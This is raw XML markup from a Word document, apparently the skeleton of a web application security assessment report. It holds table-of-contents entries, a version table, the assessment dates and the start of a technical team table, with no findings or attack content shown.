            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:color w:val="auto"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>APPENDIX A: ASSESSMENT INFORMATION</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146504 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AC1F93C" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146505" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>LIST OF IP DOING ASSESSMENT</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146505 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E833662" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146506" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.2.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>LIST OF TOOLS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146506 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1ACA214D" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146507" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.3.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>LIST OF OWASP TESTCASE</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146507 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="576C3654" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146508" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:color w:val="auto"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>APPENDIX B: RISK CLASSIFICATION</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146508 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D6D068F" w14:textId="77777777" w:rsidR="00AF754A" w:rsidRDefault="00CF6C25" w:rsidP="0056691F">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="0000FF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="0000FF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA1982F" w14:textId="77777777" w:rsidR="00AF754A" w:rsidRDefault="00AF754A" w:rsidP="0056691F">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="0000FF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7457FCD7" w14:textId="77777777" w:rsidR="00AF754A" w:rsidRPr="00AF754A" w:rsidRDefault="00AF754A" w:rsidP="0056691F">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="0000FF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:sectPr w:rsidR="00AF754A" w:rsidRPr="00AF754A" w:rsidSect="00E63D0D">
          <w:headerReference w:type="even" r:id="rId13"/>
          <w:headerReference w:type="default" r:id="rId14"/>
          <w:footerReference w:type="even" r:id="rId15"/>
          <w:footerReference w:type="default" r:id="rId16"/>
          <w:headerReference w:type="first" r:id="rId17"/>
          <w:footerReference w:type="first" r:id="rId18"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="699" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E8BC607" w14:textId="77777777" w:rsidR="0010660E" w:rsidRDefault="00CD2750" w:rsidP="00AC213D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc251942033"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PROJECT INFORMATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0338F98D" w14:textId="77777777" w:rsidR="00AC213D" w:rsidRPr="00AC213D" w:rsidRDefault="00AC213D" w:rsidP="002A4F04">
      <w:r w:rsidRPr="00AC213D">
        <w:t xml:space="preserve">The report is divided into several sections including </w:t>
      </w:r>
      <w:r w:rsidR="00A826C9">
        <w:t>ex</w:t>
      </w:r>
      <w:r w:rsidR="0056691F">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00A826C9">
        <w:t xml:space="preserve">cutive report and detail report </w:t>
      </w:r>
      <w:r w:rsidR="00BA0B32">
        <w:t xml:space="preserve">for findings </w:t>
      </w:r>
      <w:r w:rsidR="00A826C9">
        <w:t>of</w:t>
      </w:r>
      <w:r w:rsidR="00BA0B32">
        <w:t xml:space="preserve"> application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCA4534" w14:textId="77777777" w:rsidR="00CB354F" w:rsidRDefault="00AC213D" w:rsidP="00FE5DAE">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc34146487"/>
      <w:r w:rsidRPr="00AC213D">
        <w:t>VERSION OF DOCUMENT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent11"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="704"/>
        <w:gridCol w:w="2552"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1417"/>
        <w:gridCol w:w="2973"/>
      </w:tblGrid>
      <w:tr w:rsidR="007F65D5" w14:paraId="667FA77B" w14:textId="77777777" w:rsidTr="007F6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9CDB176" w14:textId="77777777" w:rsidR="001020DE" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="009B64A1">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2552" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="431DD6FB" w14:textId="77777777" w:rsidR="001020DE" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="009B64A1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:t>UPDATE DATE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6ACD303A" w14:textId="77777777" w:rsidR="001020DE" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="009B64A1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:t>VERSION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1417" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5CC00121" w14:textId="77777777" w:rsidR="001020DE" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="009B64A1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:t>TYPE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2973" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4CF823BB" w14:textId="77777777" w:rsidR="001020DE" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="009B64A1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:t>AUTHOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007F65D5" w14:paraId="1B044DCA" w14:textId="77777777" w:rsidTr="007F6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A48FEC3" w14:textId="77777777" w:rsidR="008725E0" w:rsidRPr="005E1C4E" w:rsidRDefault="008725E0" w:rsidP="008725E0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00386412">
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2552" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6D6259F3" w14:textId="77777777" w:rsidR="008725E0" w:rsidRDefault="008725E0" w:rsidP="008725E0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>2021-06-06</w:t>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00215F1F" w:rsidRPr="00215F1F">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7121BAAE" w14:textId="77777777" w:rsidR="008725E0" w:rsidRDefault="008725E0" w:rsidP="008725E0">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>v1</w:t>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00215F1F">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1417" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3603ABB5" w14:textId="77777777" w:rsidR="008725E0" w:rsidRDefault="008725E0" w:rsidP="008725E0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Draft</w:t>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2973" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="45DF1A64" w14:textId="77777777" w:rsidR="008725E0" w:rsidRDefault="008725E0" w:rsidP="008725E0">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>PhucLT</w:t>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
            <w:r w:rsidR="00DD0918">
              <w:t/>
            </w:r>
            <w:r>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F290199" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="002F47E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc34146488"/>
      <w:r>
        <w:t>IMPLEMETATION TIME</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="332EFB70" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="002F47E8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E55260">
        <w:t>Web Application Assessment</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="008725E0">
        <w:t>2021-05-19 - 2021-07-19</w:t>
      </w:r>
      <w:r w:rsidR="008357F1">
        <w:t/>
      </w:r>
      <w:r w:rsidR="00646290">
        <w:t/>
      </w:r>
      <w:r w:rsidR="008357F1">
        <w:t/>
      </w:r>
      <w:r w:rsidR="002B5ADB">
        <w:t/>
      </w:r>
      <w:r w:rsidR="008357F1">
        <w:t/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C70BBA6" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="002F47E8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc34146489"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t>TECHNICAL TEAM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent110"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="704"/>
        <w:gridCol w:w="5103"/>
        <w:gridCol w:w="3540"/>
      </w:tblGrid>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="59A9E709" w14:textId="77777777" w:rsidTr="00865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BDB9F7A" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5103" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3381F2CC" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>TECHNICIAN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3540" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B4C501B" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="002F47E8" w:rsidRDefault="002F47E8" w:rsidP="0030517C">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F47E8">
              <w:rPr>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>ROLE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00865CF1" w:rsidRPr="00706ED0" w14:paraId="41279844" w14:textId="77777777" w:rsidTr="00865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112C31" w14:textId="77777777" w:rsidR="002F47E8" w:rsidRPr="00DC18FD" w:rsidRDefault="00C170BC" w:rsidP="0030517C">
